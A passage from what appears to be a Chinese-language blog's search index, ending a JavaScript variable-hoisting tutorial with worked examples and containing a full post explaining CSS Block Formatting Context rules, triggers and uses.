class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="built_in">console</span>.log( a );  <span class="comment">//输出undefined</span></span><br><span class="line">    a = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> b;          <span class="comment">//返回函数b</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line">fn()();                <span class="comment">//相当于b()，输出3</span></span><br><span class="line">a = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="例子六"><a href="#例子六" class="headerlink" title="例子六"></a>例子六</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log( num );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fn2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( fn1() );</span><br><span class="line"><span class="keyword">var</span> b = fn1();</span><br><span class="line">b();</span><br></pre></td></tr></table></figure><p>改写顺序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log( num );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> num;</span><br><span class="line">    num = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> fn2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b;</span><br><span class="line"><span class="built_in">console</span>.log( fn1() ); <span class="comment">//先执行fn1(),返回fn2,输出fn2的函数体</span></span><br><span class="line">b = fn1();            <span class="comment">//b=fn2</span></span><br><span class="line">b();                  <span class="comment">//fn2(),输出10</span></span><br></pre></td></tr></table></figure><h3 id="例子七"><a href="#例子七" class="headerlink" title="例子七"></a>例子七</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log( <span class="number">123</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fn1;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( a );</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( fn1() );</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">fn1()();<span class="comment">//输出undefined,undefined,undefined,1,0,undefined,报错</span></span><br></pre></td></tr></table></figure><p>改写顺序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log( <span class="number">123</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fn1();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="built_in">console</span>.log( a );</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line">a();                 <span class="comment">//fn1=&gt;console.log(a)=&gt;undefined</span></span><br><span class="line">a();        <span class="comment">//fn1=&gt;console.log(a)=&gt;undefined</span></span><br><span class="line">a = <span class="number">0</span>;</span><br><span class="line">a = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">console</span>.log( fn1() );<span class="comment">//undefined,1</span></span><br><span class="line"><span class="built_in">console</span>.log( a );    <span class="comment">//0</span></span><br><span class="line">fn1()();             <span class="comment">//fn1()=&gt;console.log(a)=&gt;undefined,a()=&gt;报错</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BFC</title>
      <link href="2018/08/03/%E6%95%B4%E7%90%86-BFC/"/>
      <url>2018/08/03/%E6%95%B4%E7%90%86-BFC/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是BFC"><a href="#什么是BFC" class="headerlink" title="什么是BFC"></a>什么是BFC</h2><p>在一个Web页面的CSS渲染中，<a href="http://www.w3.org/TR/CSS21/visuren.html#block-formatting" target="_blank" rel="noopener">块级格式化上下文</a> (Block Fromatting Context)是按照块级盒子布局的。W3C对BFC的定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浮动元素和绝对定位元素，非块级盒子的块级容器（例如 inline-blocks, table-cells, 和 table-captions），以及overflow值不为“visiable”的块级盒子，都会为他们的内容创建新的BFC（块级格式上下文）。</span><br></pre></td></tr></table></figure><a id="more"></a><p>为了便于理解，我们换一种方式来重新定义BFC。一个HTML元素要创建BFC，则满足下列的任意一个或多个条件即可：</p><p>1、float的值不是none。<br>2、position的值不是static或者relative。<br>3、display的值是inline-block、table-cell、flex、table-caption或者inline-flex<br>4、overflow的值不是visible</p><p>BFC是一个独立的布局环境，其中的元素布局是不受外界的影响，并且在一个BFC中，块盒与行盒（行盒由一行中所有的内联元素所组成）都会垂直的沿着其父元素的边框排列。</p><h2 id="BFC布局规则"><a href="#BFC布局规则" class="headerlink" title="BFC布局规则"></a>BFC布局规则</h2><ol><li>内部的Box会在垂直方向，一个接一个地放置。</li><li>Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠</li><li>每个BFC内部元素的左外边距， 与包含块的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</li><li>BFC的区域不会与float box重叠。</li><li>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</li><li><p>计算BFC的高度时，浮动元素也参与计算</p><h2 id="BFC解决的问题"><a href="#BFC解决的问题" class="headerlink" title="BFC解决的问题"></a>BFC解决的问题</h2></li></ol><table><thead><tr><th>作用</th><th>原理</th></tr></thead><tbody><tr><td>外边距合并问题</td><td>同一个BFC的两个相邻Box的margin会发生重叠</td></tr><tr><td>浮动的高度塌陷问题</td><td>计算BFC的高度时，浮动元素也参与计算</td></tr></tbody></table><hr><h2 id="2-什么是BFC，BFC的布局规则是什么，如何创建BFC"><a href="#2-什么是BFC，BFC的布局规则是什么，如何创建BFC" class="headerlink" title="2.什么是BFC，BFC的布局规则是什么，如何创建BFC"></a>2.什么是BFC，BFC的布局规则是什么，如何创建BFC</h2><ul><li>BFC的定义:</li></ul><blockquote><p> BFC（Block formatting context ）“块级格式上下文”。 是用于布局块级盒子的一块渲染区域。并且与这个区域的外部毫无关系。</p></blockquote><ul><li>BFC的布局规则</li></ul><blockquote><p>内部的Box会在垂直方向，一个接一个地放置。</p><p>Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠。</p><p>每个盒子（块盒与行盒）的margin box的左边，与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</p><p>BFC的区域不会与float box重叠。</p><p>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</p><p>计算BFC的高度时，浮动元素也参与计算。</p></blockquote><ul><li>触发BFC的条件:</li></ul><p>满足下列条件之一就可以触发BFC</p><blockquote><p>1：根元素，即html元素</p><p>2：float的值不为none</p><p>3：overflow的值不为visible</p><p>4：display的值为inline-block、table-cell、table-caption</p><p>5：position的值为absolute或者fixed</p></blockquote><ul><li>BFC的作用</li></ul><p>BFC是页面独立的一个容器，与外界的毫无关系。与不同容器的区别是：</p><p>（1）<strong>可以阻止元素被浮动的元素覆盖</strong>（可做两栏布局自适应）</p><p><img src="https://img-blog.csdnimg.cn/20190428161126130.png" alt="1"></p><p>​       触发红色盒子的BFC后</p><p><img src="https://img-blog.csdnimg.cn/20190428161306268.png" alt="2"></p><p>（2）<strong>解决高度塌陷</strong>：我们知道当浮动的盒子的父元素没有高度时，会出现高度塌陷现象。</p><p>​                                   <img src="https://img-blog.csdnimg.cn/20190428162141491.png" alt="3"></p><p>​           父盒子触发BFC可以解决这个问题,根据布局规则的最后一条。</p><p>（3）<strong>解决同一个BFC区域的垂直方向margin塌陷的问题</strong> </p><p><img src="https://img-blog.csdnimg.cn/20190428165048481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjU3MTI5,size_16,color_FFFFFF,t_70" alt="4"></p><p>​           分为两个不同的BFC之后可以解决 </p>]]></content>
      
      
      <categories>
          
          <category> BFC </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
